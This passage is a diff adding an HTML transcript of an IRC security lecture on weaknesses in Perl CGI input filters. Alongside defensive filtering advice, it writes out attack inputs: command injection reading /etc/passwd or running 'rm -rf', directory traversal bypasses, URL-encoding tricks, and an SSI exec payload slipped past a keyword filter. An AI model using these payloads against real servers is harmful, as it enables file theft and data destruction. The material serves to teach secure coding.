@@ -1,0 +1,773 @@
+
+<HTML><HEAD><TITLE>Problems in Perl Filters - by b0iler</TITLE>
+</HEAD>
+<BODY bgColor=black><FONT color=#ffffff>
+<hr color="#808080" width="60%" size="1">
+<H1 align="center"><font size="4">Problems in Perl Filters</font></H1>
+<p align="center">&nbsp;by <a href="mailto:b0iler@hotmail.com">b0iler</a> <BR>&nbsp; lecture given on 
+may 17th in irc.unixhideout.con #bsrf<BR>&nbsp;Written for :<BR>&nbsp;<A 
+href="http://b0iler.eyeonsecurity.net/">http://b0iler.eyeonsecurity.net/</A> - 
+my site full of other cool tutorials<BR>&nbsp;<A 
+href="http://blacksun.box.sk/">http://blacksun.box.sk/</A> - a legendary site 
+full of original tutorials </p>
+<hr color="#808080" width="60%" size="1">
+<p align="left"><BR><BR>--- b0iler has changed the topic to: 
+Blacksun Research Facility - <a href="http://blacksun.box.sk">http://blacksun.box.sk</a> - lecture in progress: 
+"Problems in Perl Filters" - msg questions during lecture to b0iler. <BR>--- 
+b0iler sets modes [#bsrf +m]<BR>
+</p>
+<TABLE cellSpacing=2 cellPadding=0 width="100%">
+  <TBODY>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD width="100%"><FONT color=#ffffff>Common Filtering Problems in 
+      Perl.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>--intro</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This lecture may also be helpful to other 
+      languages, but the exact syntax and ideas are for perl.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This lecture will be +m and all questions will be 
+      msg'd to me, msg me questions anytime and I will ether answer them at that 
+      time, or save it till the end.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This lecture may go at a slow pace, this is so I 
+      can think things out.. since my planning of this lecture was pretty weak. 
+      If you get bored, too bad XD~</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>--</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>The Main Concepts in Evading Perl Filters 
+      Are:</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Complete lack of filters.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Filters that forget characters.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Filters that are in the wrong order.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Filters that filter previous filters (or filter 
+      themselves! I'll explain later).</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>And multiple inputted variables forgotten in the 
+      filters.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>--</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>The What and Why of Perl Filters:</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Lets get into what perl filters are and why they 
+      are so important in terms of security.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Filters are ways perl programers stop bad things 
+      from happening. It's my way of saying things that change something.. most 
+      of the time it is just reg ex.</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>For example, if you do: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah = `cat $ENV{'QUERY_STRING'}`; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Then attackers can easily input something like: 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>script.cgi?/etc/password </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Which would read your password file, or they could 
+      be even more tricky and do something to this effect: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>script.cgi?file.txt;rm -rf anything/ </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>(need to url encode some characters) </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>So perl programmers filter out characters which 
+      can do bad things. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This is a pretty good idea, and almost every 
+      script should have some kind of filtering system set up. Although even one 
+      flaw in a filtering system can lead to alot of security headaches. 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>-- </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Types Of Filtering: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>There are two main types of filtering, they are: 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>input </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>output </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>The input filtering is the most used, and is 
+      usually the most serious for security. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>It comes before any action is taken on the user 
+      input. This will stop any bad characters from effecting the actions of the 
+      script. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Many people make the mistake to only filter input. 
+      Although not always nessasary, output filtering is very useful in stopping 
+      file reading vulnerabilities, cross site scriptting, and other attacks. 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Output filtering is filtering things right before 
+      they are outputted to the client, database, file, or other outputs. 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Some times the output filtering may look to be 
+      pointless, but data may have been changed throughout the script's 
+      execution, so checking to make sure nothing bad is outputted can be a good 
+      idea even when you are fairly sure nothing bad can be. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>-- </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Ways of Filtering: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>There is also two main ways of filtering: 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Filtering bad input </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Allowing good input </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>There are also other possible ways to filter, such 
+      as length checking, pattern checking, and other odd ones. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Filtering bad input is the most used, and the one 
+      with the most mistakes by the programmers. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>When filtering bad input it is extremely easy to 
+      forget something or not know of a feature in perl or a feature in an 
+      external program which your script uses. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>These forgotten filters can lead to 
+      vulnerabilities very easily. It just takes the attacker awhile to think up 
+      of creative ways to evade the filters or to do something a different way - 
+      if one way is filtered do it a different way which isn't filtered. 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Allowing good input is the preferred way of 
+      stopping bad input from becoming a security problem. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This is because you are only allowing the good 
+      character to get by, and stopping all possible bad combinations which 
+      would have been hard to filter out with filtering bad input. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Sometimes allowing input is almost impossible if 
+      you want to give users any flexability. You cannot always hold them to a 
+      set of characters, but you need to make a desision on how much importance 
+      should go into security and how much into useability. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Here is an example of filtering bad input: 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah = $ENV{'QUERY_STRING'}; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/\;//; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>print `cat $blah`; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This will stop people from doing `cat 
+      file.txt;touch file2.txt` (using the ; to issue another command). 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>But if you read my "Hacking CGI - Security and 
+      Exploitation" tutorial ( 
+      http://b0iler.eyeonsecurity.net/tutorials/hackingcgi.htm ) then you will 
+      read about the number of ways to use different methods to do things in 
+      system commands. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>It is extremely hard to stop all the possible 
+      combinations of bad input individually. So instead lets take a look at 
+      only allowing good input: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah = $ENV{'QUERY_STRING'}; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/[^a-zA-Z0-9\.\-_]//g; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>print `cat $blah`; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>print `cat $blah`; #* </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This will stop anything that might not be good in 
+      a filename from being cat'd. But there is another method of allowing good 
+      input that I prefer. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This method is denying access to anything if the 
+      user inputs a character not allowed: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah = $ENV{'QUERY_STRING'}; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>if($blah =~ m/[^a-zA-Z0-9\.\-_]/){ die "bad 
+      characters, only allowed a-zA-Z0-9 . - and _\n"; } </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>print `cat $blah`; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Ok, enough with the background info. Lets learn 
+      how to break these things shall we? </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>-- </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>My Exploiting Filters Process: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>The way I do it is to first look for common 
+      mistakes in filters. I don't even really think about what should or 
+      shouldn't be allowed in. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>I first see if they are filtering bad input or 
+      only allowing good input. If it is only allowing good input then my 
+      testing will most likely be short. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>I will see what I can do with the allowed 
+      characters, most likely not much. Then I will go over the rest of the 
+      script and see if anything perticular can be harmed with any of the 
+      allowed characters. These are mostly design flaws which the filters allow 
+      to be exploited. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>If they are filtering bad input, then things get a 
+      bit more fun =) </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Before even looking at what the script does I will 
+      see if they forgot any of the basics: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Did they forget any bad characters? </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Can the filter be evaded with character insertion? 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Do they filter in the correct order? </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Did they forget to filter any user input? 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>I make notes of any possible problems and then I 
+      go look over what the script does in detail. After I look over the design 
+      of the script I look for specific calls which can be abused. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>I then go back to the filters and see if any combo 
+      of allowed characters can abuse these calls. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>If nothing pops up at me I'll go sit and think 
+      about way to evade the filter. Sometimes I'll have to do alot of testing 
+      inorder to see how the filter works in certain situations and if anything 
+      can be slipped by. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>I've learned alot from testing filters for holes 
+      when I was new to perl auditting. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Just brainstorming about possible ways to defeat 
+      filters is about the best advice I can give. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>It is also a very good idea to know alot about the 
+      other factors at play. Many times you can find a little/unknown feature in 
+      something which the script does not filter for. If the programmer didn't 
+      know a character did something then they will probably not filter for it. 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>-- </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Actually Exploiting Filters: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This will hopefully be the bulk of the lecture, 
+      and where you learn the most important bits of information. This is in no 
+      way a complete list or anything, I hope some of you find new methods of 
+      evading filters and share them with me ( b0iler@hotmail.com ) 
+</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>I do not wish to feed the script kiddies out there 
+      by giving away exact ways to exploit filters, but it's a nessassary evil 
+      inorder for others to learn security. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>I'll start with directory transversal filters. The 
+      basics being these: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/\.\.//g; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/\.\.\///g; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/\.//; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/[^\w\._\-]//; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>There are more, but these are a few of them. The 
+      first one filters for the string '..' So to evade this one you can do 
+      something like: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah = '.\./'; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Which will get by the filter and still go back a 
+      directory. This trick also works for the next one, which filters for '../' 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>But this one has another problem. It takes out any 
+      string that matches '../' this means 'ab../cd' would turn into 'abcd' and 
+      something like: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah = '.../...//'; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Now after the filter removes any '../' from $blah 
+      it becomes '../' so to fix this we need to add a loop to the filter, deny 
+      user input, or not replace the string with nothing. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>a loop example would be: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>while($blah =~ /\.\.\//){ $blah =~ s/\.\.\///; } 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Denying user input example: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>if($blah =~ /\.\.\//){ die "illegal string in 
+      input.\n"; } </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>replacing the string with something example: 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/\.\.\//_/; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>All these would stop the '.../...//' attack. The 
+      last one would turn '.../...//' into '._._/' </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Now the 3rd filter works good for getting rid of 
+      any reverse directory transversals ('../'), but it cannot be used if the 
+      '.' is needed for input. There isn't really anyway around this unless you 
+      specify a full pathname starting at root, ex. '/etc/passwd' which has not 
+      '.' in it. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>The 4th is the best of the these filters, it is 
+      only allowing what we know is good. No suprises that we didn't think of 
+      can get in there. It might be a good idea to also filter for '..' with 
+      this one just in case. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Lets move on from directory transversal filters 
+      and discuss the main techniques used with defeating filters. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>+Complete lack of filters </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This is a pretty obvious way of getting past 
+      filters, if they don't exist they cannot stop you. ;) </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Many times programmers have no clue about security 
+      don't put any filters in or they forget one or two needed filters. 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Always take the time to think about everything the 
+      user inputs and weather you should filter it or not. When in doubt I would 
+      say filter atleast for the allowed characters just to be safe. 
+  </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>+Filters that forget characters </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This is close to the forgetting filters one, but 
+      this time the programmer was trying to be secure, but forgot a key 
+      string/character. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Most of the time it is because the programmer does 
+      not know that the string they missed can be used to cause damage. 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>For instance, a newbie linux user might not know 
+      that &amp;&amp; can be used to issue additional commands. So they forget 
+      this filter even when filtering for | and ; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>sorry, *nix user </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>print `cat /etc/passwd &amp;&amp; less 
+      /etc/hosts`; #to demonstrate how multiple commands can be used with 
+      &amp;&amp; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Inorder to deal with any type of shell commands I 
+      would suggest being an expert in the shell, learning alot about the 
+      different ways perl can open a shell, and filter really good (only 
+      allowing what is good). </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Check my paper: 
+      http://b0iler.eyeonsecurity.net/tutorials/hackingcgi.htm for more examples 
+      of this technique. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>+Filters that are in the wrong order </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>It is a good idea to take time out and think of 
+      what order your filters should come in. If you filter something in the 
+      wrong order problems can occur. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>The most widely avalible example of this would be 
+      something like: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/aa//g; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", 
+      hex($1))/eg; #convert url encoding to ascii </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>A way to defeat this 'aa' filter would be to url 
+      encode your 'aa' as '%61%61'. This next filtering problem is almost the 
+      same as this one. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>+Filters that filter previous filters 
+</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This is a strange one I found pretty earily in my 
+      perl journey. This one is simular to the '.../...//' trick discribed 
+      eariler. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>What happends is that one filter is looking for a 
+      string, and another filter changes the string later. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>So an attacker can get a string to pass the first 
+      filter, and then have the next filter(s) change the string into a 
+      dangerous one. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>An example is easier to follow: </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/&lt;!--(.|\n)*--&gt;//g; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/javascript//ig; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Above we have the most common used filter to 
+      prevent ssi and a filter for 'javascript'. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>The way to get around this filter is to use the 
+      'javascript' filter inorder to change a string into ssi. So if: 
+  </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah = '&lt;javascript!-- #exec cmd="rm -rf 
+      /home/you/www" --&gt;'; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Then $blah will pass the first filter without 
+      getting changed, and then be turned into '&lt;!-- #exec cmd="rm -rf 
+      /home/you/www" --&gt;' which is a bad string, and would have been filtered 
+      by the first filter. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
